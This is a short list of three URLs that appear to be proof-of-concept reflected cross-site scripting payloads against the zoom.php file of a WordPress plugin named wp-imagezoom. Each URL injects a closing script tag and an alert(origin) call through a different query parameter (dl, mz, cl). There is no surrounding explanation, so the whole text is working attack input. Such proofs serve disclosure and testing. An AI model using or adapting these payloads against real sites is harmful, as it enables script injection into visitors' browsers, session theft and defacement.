https://example.com/wp-content/plugins/wp-imagezoom/zoom.php?dl='</script><script>alert(origin)</script>
https://example.com/wp-content/plugins/wp-imagezoom/zoom.php?mz='</script><script>alert(origin)</script>
https://example.com/wp-content/plugins/wp-imagezoom/zoom.php?cl='</script><script>alert(origin)</script>
